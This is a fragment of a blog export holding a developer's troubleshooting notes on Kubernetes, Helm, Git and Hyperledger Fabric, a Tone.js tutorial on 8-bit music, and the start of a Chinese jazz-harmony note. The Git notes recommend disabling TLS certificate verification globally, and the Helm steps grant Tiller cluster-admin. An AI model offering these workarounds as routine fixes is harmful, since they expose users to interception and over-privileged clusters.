hub?</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error syncing pod, skipping: failed to &quot;StartContainer&quot; for &quot;POD&quot; with ErrImagePull: &quot;image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>- using `yum install -y subscription-manager rhsm` to help the k8s pull from the right place\n- But unfortunately, I failed to install both rhsm and subscription. In fact, rhsm has been replace by RedHat&apos;s subscription-manager. It cannot works for my machine, yet subscription-manager installed successfuly.\n- So I have to search the old version of rhsm and then use rpm installation tool to force my systemd to use rhsm.\n- Here is the package download address: \n- https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm\n- https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-1.19.10-1.el7_4.x86_64.rpm\n- Both rhsm and certificate should installed in order, the rhsm is rely on the certificate tool. \n- Make sure you download the two package on the same folder and use `rpm -ivh python-rhsm-*.rpm` to keep the installation in order.\n</code></pre><ol start=\"3\">\n<li><p>After I deal with the rhsm ERROR, kubernetes throw up another problem immediately to me, compelling me to keep dive into the OPS stuff with unprepared technology experience. </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (net/http: request canceled)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<pre><code>- As plain as on the screen, kubernetes cannot interactive docker to pull a image from hub. Most of the solution that I used for settle is using the proxy(To bypass the GWF).\n- Using `docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest`, it looks good to me.\n</code></pre><ol start=\"4\">\n<li><p>If you choose <code>hostpath</code> as your presistentVolume, you can only use <code>ReadWriteOnce</code> for single node, since you developments environment is single node.</p>\n</li>\n<li><p>And if you create a service without defining a selector as in a yaml file, like most people do in case to select the pods, endpoints will not be create. But, fortunatly, kubernetes offers a alternative way to make sure you container, which deployed in some specific pods, to communicate with other exogenous container. </p>\n<ul>\n<li>declaring another kind as endpoints, as you can noticed when you use <code>kubectl get endpoints</code>, which endpoints defined as a permanent word in kubetctl, to create a type of component, with setting some propetries.</li>\n<li>when it comes to the imperative complexity, multiple ports is be requisted in many services deployment. As defined in whether kubernetes or any network policy, exposing more than one port is necessary. Kubernetes supports multiple port definitions on a Service object. Resulting from that predefined statements, when using multiple ports you must give all of your ports names, so that endpoints can be disambiguated.  </li>\n<li>Endpoint will not be alloted unless the pods be created.</li>\n</ul>\n</li>\n<li><p>helm init failure becuase of the image pulling crash. So I need to setting a docker-proxy and daemon-reload/restart docker to pull the images again.</p>\n</li>\n<li><p>Though helm init successfully when image has been pulled, helm still cannot connect to the kubernetes api server. It shows:</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error: Get http://localhost:8080/api/v1/namespaces/kube-system/configmaps?labelSelector=OWNER%!D(MISSING)TILLER: dial tcp [::1]:8080: connect: connection refused</span><br></pre></td></tr></table></figure>\n<ul>\n<li>It seems that the tiller pod in kubernetes cannot connect to the api servier cause lack of HOST or DNS. </li>\n<li>Using <code>docker exec -it container_ip env</code> to get the environment variable to check whether the KUBERNETES_SERVICE_HOST exists. Then I got the 10.254.0.1, it looks like the default kuberentes service IP</li>\n</ul>\n</li>\n<li><p>In the Great China, most of the Internet stuff about the goolge cannot be accessible. But some tech company are willing to help other programmer to get access google cloud, npm and any repo which is blocked in the outside of the GWF. It is the same as the helm. The final solution for me is installing an aliyun version of helm to get to start the tiller. Also, don’t forget to get the right version matching between client and server.</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts</span><br><span class=\"line\">kubectl create serviceaccount --namespace kube-system tiller</span><br><span class=\"line\">kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller</span><br><span class=\"line\">kubectl patch deploy --namespace kube-system tiller-deploy -p &apos;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&apos;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Noticed that when I using 2.10 version of helm, there is an gorouting error happend by typing <code>helm ls</code></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x1276506] tiller</span><br></pre></td></tr></table></figure>\n<ul>\n<li>That is a dev bug undering the development of the helm.</li>\n<li>downupgrde you helm to 2.9.1 will be fine.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h1><ol>\n<li><code>Encountered end of file</code><ul>\n<li>Add $GIT_CURL_VERBOSE=1 can solved that problem </li>\n</ul>\n</li>\n<li>Still be annoied by the useless private gitlab server, problem comes one by one without any obviating indication. <ul>\n<li><code>Peer&#39;s Certificate issuer is not recognized.</code></li>\n<li>two solutions, the first one is setting GIS_SSL_NO_VERIFY environment parametes to true</li>\n<li>the another one is using <code>git config --global http.sslVerify false</code> to solving the config missing</li>\n</ul>\n</li>\n<li><p>git can not clone a repo from a unsafe link </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fatal: unable to access &apos;https://***.git/&apos;: SSL certificate problem: self signed certificate</span><br></pre></td></tr></table></figure>\n<ul>\n<li>solution: add a environment in the front of you command:</li>\n<li>GIT_SSL_NO_VERIFY=true git clone <em>**</em></li>\n</ul>\n</li>\n<li>what if you used a Github account on your mac before but now your changed your account?</li>\n</ol>\n<p>Try remove your account:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git credential-osxkeychain erase</span><br><span class=\"line\">host=github.com</span><br><span class=\"line\">protocol=https</span><br><span class=\"line\">[Press Return]</span><br></pre></td></tr></table></figure>\n<p>and using <code>git push</code>  or whatever the command to handle git and login your git account again.</p>\n<h1 id=\"Hyperledger-Fabric\"><a href=\"#Hyperledger-Fabric\" class=\"headerlink\" title=\"Hyperledger Fabric\"></a>Hyperledger Fabric</h1><ol>\n<li><p><code>Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host</code></p>\n<ul>\n<li>Small fix difícil de conseguir para Hyperledger Fabric 1.1.0 corriendo en Docker Swarm. Multiples organizations corriendo en un mismo host:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">createChaincodeServer -&gt; ERRO 02a Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host</span><br><span class=\"line\"></span><br><span class=\"line\">Resulta que para la versión 1.1.0 de HLF se requiere incluir esta propiedad en el environment section del docker-compose.yaml de los peers:</span><br><span class=\"line\"></span><br><span class=\"line\">CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p><code>Error: Error: Calling enrollment endpoint failed with error [Error: read ECONNRESET]</code></p>\n<ul>\n<li>When I try to monitor a event hub for chaincode calling in node SDK, some error throw up after I use my own script to create channel, join, and other stuff. </li>\n<li>The weird things is that, checking the ca container looks good to me. Then I recalled that if it is my fault that not to add remove temp file cache in scripts. So I rechecked it again, however, I cleared the cache. </li>\n<li>How can this happend without any change I did to the server. So I debug my script by line: after I started up the network, I did other channel stuff in few seconds. It surprised me that the log did not throw the error mentioned above. </li>\n<li>It turns out that I can create the channel immediately when I started up the docker-compose.</li>\n<li>Add sleep 5 to the scripts will be fine.</li>\n</ul>\n</li>\n<li><p><code>Promise is rejected: Error: 2 UNKNOWN: access denied: channel [mychannel] creator org [Org1MSP]</code></p>\n<ul>\n<li>orgpeercan not be found in channel</li>\n</ul>\n</li>\n<li><code>error executing chaincode: failed to execute transaction: timeout expired while executing transaction</code><br>Probably because of the chaincode is not installed perfectly</li>\n</ol>\n"},{"layout":"title","title":"Using Tone.js to make 8 bit music","date":"2018-03-01T16:31:08.000Z","_content":"\n## What is 8 bit music\n8 bit music is also called chip music.\n\nAt that time, only small memory can be installed in game console （e.g. FC). Producer cannot make high sampling-rate PCM music. But music is necessary when we play games. One solution is making music real time, which the played music can quickly clean the used memory and rebuild the next note. \n\nWhen making 8 bit music, we should storage the basic sound into the device priority. In the game music, we also needs to upload our music code (like the score) into the program. In this way we can make a game music, which become more popular in nowdays and gradually forming a new style on electricity music genre.\n\n## How to make 8 bit mudic\n\nWe use FC (Family Computer) as an example to explain 8 bit music. In the music system of FC, instrument is not exist. It only provided different waves to producer. When composing, people needs to transform different waves into different audio effect.\n\n5 tracks in FC:\n\n1. square wave (2 track)\n\n![square wave](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nSquare wave occupy two track, since it has variable proportions waves. Thus the wave generate different tone. Piano, guitar and other instrument can be simulated by this wave.  \n\n2. triangular wave (1 track)\n\n![triangular wave](https://i.loli.net/2019/02/12/5c62ce1f6c3b1.jpg)\n\nsometime we use this wave to simulate bass\n\n3. noise (1 track)\n\nNoise is the most common audio effect in games. We use noise to create the environment sound, like explode, footstep, crash and the rhythmic tapping.\n\n4. Sampling (1 track)\n\nSampling track is more complex than other. We don't need to dig it all up. \n\n#### Note: How to modify a note\n\nUsually, we use volumn, trill or envelope (ADSR) to polish the sound. \n\n## Web Audio\n\nHere is a [website](https://codepen.io/anon/embed/LxJEaj?slug-hash=LxJEaj&default-tab=result&height=300&theme-id=0&embed-version=2&user=anon) to exhibit web audio: \n\nHowever, you may notice that FC didn't provide sin wave. Because sin/cos wave is published after the game console. It is more soft than normal FC sound. \n\nTone.js is open source web audio SDK for developer make music using JS. We choose Tong.js because:\n\n+ Tone.js accepted we edit pitch rather than ask us play 440Hz sound. For example, it packaged the scale into the library, we don't need to play a sound which exactly is 440Hz.\n+ It packaged Attack and Release in ADSR (Attack, Decay, Sustain, Release). More convenience to develop \n\n## Steps\n\n1. Essential functon in Tone.js for sounding.\n\n    .triggerAttackRelease()\n\nIt including four parameter: note, duration, time and velocity.\n\nTime is related to duration which represent the position of the note in a song; velocity is a detail change, sometime 8 bit music left this parameter unchanged.\n\nThe code below is a example to show how we use these four parameter to make music.\n\n    var synth = new Tone.Synth().toMaster()\n    synth.triggerAttackRelease('C4', '4n', '8n', 1)\n    synth.triggerAttackRelease('E4', '8n', '4n + 8n', 1)\n\nIn this snippets, C4 and E4 represent the frequent of the sound. Time is accumulate and velocity is fixed. \n\nHow about we use code to write one bar?\n\n    var synth = new Tone.Synth().toMaster()\n    Tone.Transport.bpm.value = 120\n\n    synth.triggerAttackRelease('E4', '4n', '0', 1)\n    synth.triggerAttackRelease('E4', '4n', '4n', 1)\n    synth.triggerAttackRelease('F4', '4n', '2n', 1)\n    synth.triggerAttackRelease('G4', '4n', '2n+4n', 1)\n\n2. Using harmony\n\nWhat is the harmony? It is two or more sound play together, following some rules. We can use different note at the same time to composite a new harmony. \n\nAfter finished the single track editing, we need to add more instruments.\n\n    var triangleOptions = {\n    oscillator: {\n        type: 'triangle'\n    }\n    }\n\n    var squareOptions = {\n    oscillator: {\n        type: 'square'\n    }\n    }\n\n    var squareSynth = new Tone.Synth(squareOptions).toMaster()\n\n    var triangleSynth = new Tone.Synth(triangleOptions).toMaster()\n\n    var noiseSynth = new Tone.NoiseSynth().toMaster()\n\nEach tone has different wave, which represent different instruments. `squareSynth` is used to play main melody instruments, such as piano, guitar. `trangleSynth` is used to simulate bass. `noiseSynth` is used to smulate percussion music。\n\n3. Audio effect\n\nLast step we should add audio effect to make music more rich. Like I mentioned before, ADSR can create some reverberation, echo and differnet pitch. These can be achieved by `Tone.Envelope()`.\n\n![ADSR](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nHere is the code:\n\n    envelope: {\n    attack  : 0.01 ,\n    decay  : 0.1 ,\n    sustain  : 0.5 ,\n    release  : 1 ,\n    attackCurve  : linear ,\n    releaseCurve  : exponential\n    }\n\n## Consolution\nPretty easy aha, I think the next generation of music must be computer music. ","source":"_posts/Using-Tone-js-to-make-8bit-music.md","raw":"---\nlayout: title\ntitle: Using Tone.js to make 8 bit music\ndate: 2018-03-01 10:31:08\ntags: music\ncategories: Tech\n---\n\n## What is 8 bit music\n8 bit music is also called chip music.\n\nAt that time, only small memory can be installed in game console （e.g. FC). Producer cannot make high sampling-rate PCM music. But music is necessary when we play games. One solution is making music real time, which the played music can quickly clean the used memory and rebuild the next note. \n\nWhen making 8 bit music, we should storage the basic sound into the device priority. In the game music, we also needs to upload our music code (like the score) into the program. In this way we can make a game music, which become more popular in nowdays and gradually forming a new style on electricity music genre.\n\n## How to make 8 bit mudic\n\nWe use FC (Family Computer) as an example to explain 8 bit music. In the music system of FC, instrument is not exist. It only provided different waves to producer. When composing, people needs to transform different waves into different audio effect.\n\n5 tracks in FC:\n\n1. square wave (2 track)\n\n![square wave](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nSquare wave occupy two track, since it has variable proportions waves. Thus the wave generate different tone. Piano, guitar and other instrument can be simulated by this wave.  \n\n2. triangular wave (1 track)\n\n![triangular wave](https://i.loli.net/2019/02/12/5c62ce1f6c3b1.jpg)\n\nsometime we use this wave to simulate bass\n\n3. noise (1 track)\n\nNoise is the most common audio effect in games. We use noise to create the environment sound, like explode, footstep, crash and the rhythmic tapping.\n\n4. Sampling (1 track)\n\nSampling track is more complex than other. We don't need to dig it all up. \n\n#### Note: How to modify a note\n\nUsually, we use volumn, trill or envelope (ADSR) to polish the sound. \n\n## Web Audio\n\nHere is a [website](https://codepen.io/anon/embed/LxJEaj?slug-hash=LxJEaj&default-tab=result&height=300&theme-id=0&embed-version=2&user=anon) to exhibit web audio: \n\nHowever, you may notice that FC didn't provide sin wave. Because sin/cos wave is published after the game console. It is more soft than normal FC sound. \n\nTone.js is open source web audio SDK for developer make music using JS. We choose Tong.js because:\n\n+ Tone.js accepted we edit pitch rather than ask us play 440Hz sound. For example, it packaged the scale into the library, we don't need to play a sound which exactly is 440Hz.\n+ It packaged Attack and Release in ADSR (Attack, Decay, Sustain, Release). More convenience to develop \n\n## Steps\n\n1. Essential functon in Tone.js for sounding.\n\n    .triggerAttackRelease()\n\nIt including four parameter: note, duration, time and velocity.\n\nTime is related to duration which represent the position of the note in a song; velocity is a detail change, sometime 8 bit music left this parameter unchanged.\n\nThe code below is a example to show how we use these four parameter to make music.\n\n    var synth = new Tone.Synth().toMaster()\n    synth.triggerAttackRelease('C4', '4n', '8n', 1)\n    synth.triggerAttackRelease('E4', '8n', '4n + 8n', 1)\n\nIn this snippets, C4 and E4 represent the frequent of the sound. Time is accumulate and velocity is fixed. \n\nHow about we use code to write one bar?\n\n    var synth = new Tone.Synth().toMaster()\n    Tone.Transport.bpm.value = 120\n\n    synth.triggerAttackRelease('E4', '4n', '0', 1)\n    synth.triggerAttackRelease('E4', '4n', '4n', 1)\n    synth.triggerAttackRelease('F4', '4n', '2n', 1)\n    synth.triggerAttackRelease('G4', '4n', '2n+4n', 1)\n\n2. Using harmony\n\nWhat is the harmony? It is two or more sound play together, following some rules. We can use different note at the same time to composite a new harmony. \n\nAfter finished the single track editing, we need to add more instruments.\n\n    var triangleOptions = {\n    oscillator: {\n        type: 'triangle'\n    }\n    }\n\n    var squareOptions = {\n    oscillator: {\n        type: 'square'\n    }\n    }\n\n    var squareSynth = new Tone.Synth(squareOptions).toMaster()\n\n    var triangleSynth = new Tone.Synth(triangleOptions).toMaster()\n\n    var noiseSynth = new Tone.NoiseSynth().toMaster()\n\nEach tone has different wave, which represent different instruments. `squareSynth` is used to play main melody instruments, such as piano, guitar. `trangleSynth` is used to simulate bass. `noiseSynth` is used to smulate percussion music。\n\n3. Audio effect\n\nLast step we should add audio effect to make music more rich. Like I mentioned before, ADSR can create some reverberation, echo and differnet pitch. These can be achieved by `Tone.Envelope()`.\n\n![ADSR](https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg)\n\nHere is the code:\n\n    envelope: {\n    attack  : 0.01 ,\n    decay  : 0.1 ,\n    sustain  : 0.5 ,\n    release  : 1 ,\n    attackCurve  : linear ,\n    releaseCurve  : exponential\n    }\n\n## Consolution\nPretty easy aha, I think the next generation of music must be computer music. ","slug":"Using-Tone-js-to-make-8bit-music","published":1,"updated":"2019-03-11T04:32:02.607Z","comments":1,"photos":[],"link":"","_id":"ckkljsas3000jr2424ljxos1f","content":"<h2 id=\"What-is-8-bit-music\"><a href=\"#What-is-8-bit-music\" class=\"headerlink\" title=\"What is 8 bit music\"></a>What is 8 bit music</h2><p>8 bit music is also called chip music.</p>\n<p>At that time, only small memory can be installed in game console （e.g. FC). Producer cannot make high sampling-rate PCM music. But music is necessary when we play games. One solution is making music real time, which the played music can quickly clean the used memory and rebuild the next note. </p>\n<p>When making 8 bit music, we should storage the basic sound into the device priority. In the game music, we also needs to upload our music code (like the score) into the program. In this way we can make a game music, which become more popular in nowdays and gradually forming a new style on electricity music genre.</p>\n<h2 id=\"How-to-make-8-bit-mudic\"><a href=\"#How-to-make-8-bit-mudic\" class=\"headerlink\" title=\"How to make 8 bit mudic\"></a>How to make 8 bit mudic</h2><p>We use FC (Family Computer) as an example to explain 8 bit music. In the music system of FC, instrument is not exist. It only provided different waves to producer. When composing, people needs to transform different waves into different audio effect.</p>\n<p>5 tracks in FC:</p>\n<ol>\n<li>square wave (2 track)</li>\n</ol>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg\" alt=\"square wave\"></p>\n<p>Square wave occupy two track, since it has variable proportions waves. Thus the wave generate different tone. Piano, guitar and other instrument can be simulated by this wave.  </p>\n<ol start=\"2\">\n<li>triangular wave (1 track)</li>\n</ol>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f6c3b1.jpg\" alt=\"triangular wave\"></p>\n<p>sometime we use this wave to simulate bass</p>\n<ol start=\"3\">\n<li>noise (1 track)</li>\n</ol>\n<p>Noise is the most common audio effect in games. We use noise to create the environment sound, like explode, footstep, crash and the rhythmic tapping.</p>\n<ol start=\"4\">\n<li>Sampling (1 track)</li>\n</ol>\n<p>Sampling track is more complex than other. We don’t need to dig it all up. </p>\n<h4 id=\"Note-How-to-modify-a-note\"><a href=\"#Note-How-to-modify-a-note\" class=\"headerlink\" title=\"Note: How to modify a note\"></a>Note: How to modify a note</h4><p>Usually, we use volumn, trill or envelope (ADSR) to polish the sound. </p>\n<h2 id=\"Web-Audio\"><a href=\"#Web-Audio\" class=\"headerlink\" title=\"Web Audio\"></a>Web Audio</h2><p>Here is a <a href=\"https://codepen.io/anon/embed/LxJEaj?slug-hash=LxJEaj&amp;default-tab=result&amp;height=300&amp;theme-id=0&amp;embed-version=2&amp;user=anon\" target=\"_blank\" rel=\"external\">website</a> to exhibit web audio: </p>\n<p>However, you may notice that FC didn’t provide sin wave. Because sin/cos wave is published after the game console. It is more soft than normal FC sound. </p>\n<p>Tone.js is open source web audio SDK for developer make music using JS. We choose Tong.js because:</p>\n<ul>\n<li>Tone.js accepted we edit pitch rather than ask us play 440Hz sound. For example, it packaged the scale into the library, we don’t need to play a sound which exactly is 440Hz.</li>\n<li>It packaged Attack and Release in ADSR (Attack, Decay, Sustain, Release). More convenience to develop </li>\n</ul>\n<h2 id=\"Steps\"><a href=\"#Steps\" class=\"headerlink\" title=\"Steps\"></a>Steps</h2><ol>\n<li><p>Essential functon in Tone.js for sounding.</p>\n<p> .triggerAttackRelease()</p>\n</li>\n</ol>\n<p>It including four parameter: note, duration, time and velocity.</p>\n<p>Time is related to duration which represent the position of the note in a song; velocity is a detail change, sometime 8 bit music left this parameter unchanged.</p>\n<p>The code below is a example to show how we use these four parameter to make music.</p>\n<pre><code>var synth = new Tone.Synth().toMaster()\nsynth.triggerAttackRelease(&apos;C4&apos;, &apos;4n&apos;, &apos;8n&apos;, 1)\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;8n&apos;, &apos;4n + 8n&apos;, 1)\n</code></pre><p>In this snippets, C4 and E4 represent the frequent of the sound. Time is accumulate and velocity is fixed. </p>\n<p>How about we use code to write one bar?</p>\n<pre><code>var synth = new Tone.Synth().toMaster()\nTone.Transport.bpm.value = 120\n\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;4n&apos;, &apos;0&apos;, 1)\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;4n&apos;, &apos;4n&apos;, 1)\nsynth.triggerAttackRelease(&apos;F4&apos;, &apos;4n&apos;, &apos;2n&apos;, 1)\nsynth.triggerAttackRelease(&apos;G4&apos;, &apos;4n&apos;, &apos;2n+4n&apos;, 1)\n</code></pre><ol start=\"2\">\n<li>Using harmony</li>\n</ol>\n<p>What is the harmony? It is two or more sound play together, following some rules. We can use different note at the same time to composite a new harmony. </p>\n<p>After finished the single track editing, we need to add more instruments.</p>\n<pre><code>var triangleOptions = {\noscillator: {\n    type: &apos;triangle&apos;\n}\n}\n\nvar squareOptions = {\noscillator: {\n    type: &apos;square&apos;\n}\n}\n\nvar squareSynth = new Tone.Synth(squareOptions).toMaster()\n\nvar triangleSynth = new Tone.Synth(triangleOptions).toMaster()\n\nvar noiseSynth = new Tone.NoiseSynth().toMaster()\n</code></pre><p>Each tone has different wave, which represent different instruments. <code>squareSynth</code> is used to play main melody instruments, such as piano, guitar. <code>trangleSynth</code> is used to simulate bass. <code>noiseSynth</code> is used to smulate percussion music。</p>\n<ol start=\"3\">\n<li>Audio effect</li>\n</ol>\n<p>Last step we should add audio effect to make music more rich. Like I mentioned before, ADSR can create some reverberation, echo and differnet pitch. These can be achieved by <code>Tone.Envelope()</code>.</p>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg\" alt=\"ADSR\"></p>\n<p>Here is the code:</p>\n<pre><code>envelope: {\nattack  : 0.01 ,\ndecay  : 0.1 ,\nsustain  : 0.5 ,\nrelease  : 1 ,\nattackCurve  : linear ,\nreleaseCurve  : exponential\n}\n</code></pre><h2 id=\"Consolution\"><a href=\"#Consolution\" class=\"headerlink\" title=\"Consolution\"></a>Consolution</h2><p>Pretty easy aha, I think the next generation of music must be computer music. </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"What-is-8-bit-music\"><a href=\"#What-is-8-bit-music\" class=\"headerlink\" title=\"What is 8 bit music\"></a>What is 8 bit music</h2><p>8 bit music is also called chip music.</p>\n<p>At that time, only small memory can be installed in game console （e.g. FC). Producer cannot make high sampling-rate PCM music. But music is necessary when we play games. One solution is making music real time, which the played music can quickly clean the used memory and rebuild the next note. </p>\n<p>When making 8 bit music, we should storage the basic sound into the device priority. In the game music, we also needs to upload our music code (like the score) into the program. In this way we can make a game music, which become more popular in nowdays and gradually forming a new style on electricity music genre.</p>\n<h2 id=\"How-to-make-8-bit-mudic\"><a href=\"#How-to-make-8-bit-mudic\" class=\"headerlink\" title=\"How to make 8 bit mudic\"></a>How to make 8 bit mudic</h2><p>We use FC (Family Computer) as an example to explain 8 bit music. In the music system of FC, instrument is not exist. It only provided different waves to producer. When composing, people needs to transform different waves into different audio effect.</p>\n<p>5 tracks in FC:</p>\n<ol>\n<li>square wave (2 track)</li>\n</ol>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg\" alt=\"square wave\"></p>\n<p>Square wave occupy two track, since it has variable proportions waves. Thus the wave generate different tone. Piano, guitar and other instrument can be simulated by this wave.  </p>\n<ol start=\"2\">\n<li>triangular wave (1 track)</li>\n</ol>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f6c3b1.jpg\" alt=\"triangular wave\"></p>\n<p>sometime we use this wave to simulate bass</p>\n<ol start=\"3\">\n<li>noise (1 track)</li>\n</ol>\n<p>Noise is the most common audio effect in games. We use noise to create the environment sound, like explode, footstep, crash and the rhythmic tapping.</p>\n<ol start=\"4\">\n<li>Sampling (1 track)</li>\n</ol>\n<p>Sampling track is more complex than other. We don’t need to dig it all up. </p>\n<h4 id=\"Note-How-to-modify-a-note\"><a href=\"#Note-How-to-modify-a-note\" class=\"headerlink\" title=\"Note: How to modify a note\"></a>Note: How to modify a note</h4><p>Usually, we use volumn, trill or envelope (ADSR) to polish the sound. </p>\n<h2 id=\"Web-Audio\"><a href=\"#Web-Audio\" class=\"headerlink\" title=\"Web Audio\"></a>Web Audio</h2><p>Here is a <a href=\"https://codepen.io/anon/embed/LxJEaj?slug-hash=LxJEaj&amp;default-tab=result&amp;height=300&amp;theme-id=0&amp;embed-version=2&amp;user=anon\">website</a> to exhibit web audio: </p>\n<p>However, you may notice that FC didn’t provide sin wave. Because sin/cos wave is published after the game console. It is more soft than normal FC sound. </p>\n<p>Tone.js is open source web audio SDK for developer make music using JS. We choose Tong.js because:</p>\n<ul>\n<li>Tone.js accepted we edit pitch rather than ask us play 440Hz sound. For example, it packaged the scale into the library, we don’t need to play a sound which exactly is 440Hz.</li>\n<li>It packaged Attack and Release in ADSR (Attack, Decay, Sustain, Release). More convenience to develop </li>\n</ul>\n<h2 id=\"Steps\"><a href=\"#Steps\" class=\"headerlink\" title=\"Steps\"></a>Steps</h2><ol>\n<li><p>Essential functon in Tone.js for sounding.</p>\n<p> .triggerAttackRelease()</p>\n</li>\n</ol>\n<p>It including four parameter: note, duration, time and velocity.</p>\n<p>Time is related to duration which represent the position of the note in a song; velocity is a detail change, sometime 8 bit music left this parameter unchanged.</p>\n<p>The code below is a example to show how we use these four parameter to make music.</p>\n<pre><code>var synth = new Tone.Synth().toMaster()\nsynth.triggerAttackRelease(&apos;C4&apos;, &apos;4n&apos;, &apos;8n&apos;, 1)\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;8n&apos;, &apos;4n + 8n&apos;, 1)\n</code></pre><p>In this snippets, C4 and E4 represent the frequent of the sound. Time is accumulate and velocity is fixed. </p>\n<p>How about we use code to write one bar?</p>\n<pre><code>var synth = new Tone.Synth().toMaster()\nTone.Transport.bpm.value = 120\n\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;4n&apos;, &apos;0&apos;, 1)\nsynth.triggerAttackRelease(&apos;E4&apos;, &apos;4n&apos;, &apos;4n&apos;, 1)\nsynth.triggerAttackRelease(&apos;F4&apos;, &apos;4n&apos;, &apos;2n&apos;, 1)\nsynth.triggerAttackRelease(&apos;G4&apos;, &apos;4n&apos;, &apos;2n+4n&apos;, 1)\n</code></pre><ol start=\"2\">\n<li>Using harmony</li>\n</ol>\n<p>What is the harmony? It is two or more sound play together, following some rules. We can use different note at the same time to composite a new harmony. </p>\n<p>After finished the single track editing, we need to add more instruments.</p>\n<pre><code>var triangleOptions = {\noscillator: {\n    type: &apos;triangle&apos;\n}\n}\n\nvar squareOptions = {\noscillator: {\n    type: &apos;square&apos;\n}\n}\n\nvar squareSynth = new Tone.Synth(squareOptions).toMaster()\n\nvar triangleSynth = new Tone.Synth(triangleOptions).toMaster()\n\nvar noiseSynth = new Tone.NoiseSynth().toMaster()\n</code></pre><p>Each tone has different wave, which represent different instruments. <code>squareSynth</code> is used to play main melody instruments, such as piano, guitar. <code>trangleSynth</code> is used to simulate bass. <code>noiseSynth</code> is used to smulate percussion music。</p>\n<ol start=\"3\">\n<li>Audio effect</li>\n</ol>\n<p>Last step we should add audio effect to make music more rich. Like I mentioned before, ADSR can create some reverberation, echo and differnet pitch. These can be achieved by <code>Tone.Envelope()</code>.</p>\n<p><img src=\"https://i.loli.net/2019/02/12/5c62ce1f5dc96.jpg\" alt=\"ADSR\"></p>\n<p>Here is the code:</p>\n<pre><code>envelope: {\nattack  : 0.01 ,\ndecay  : 0.1 ,\nsustain  : 0.5 ,\nrelease  : 1 ,\nattackCurve  : linear ,\nreleaseCurve  : exponential\n}\n</code></pre><h2 id=\"Consolution\"><a href=\"#Consolution\" class=\"headerlink\" title=\"Consolution\"></a>Consolution</h2><p>Pretty easy aha, I think the next generation of music must be computer music. </p>\n"},{"layout":"title","title":"进行II—V-I的笔记","date":"2021-01-01T14:49:27.000Z","_content":"\n最近重新捡起我的aerophone了, 在YouTube上找到一个很不错的乐手能够教我们根练 (藤井泰宏). \n\n那么关于II-V-I, 有一个值得注意的是 II是小七和弦(2461) 记做D-7; V是属七和弦 (5724) 记做 (G7) I是大七和弦 (1357) 记Cmaj7, 差不多是在爵士中一个固定的模式, 也就是我们在调性频繁切换的时候, 根据和弦性质来判断级数. \n\n所以当我们在研究II和弦到V和弦再到I级和弦的时候, 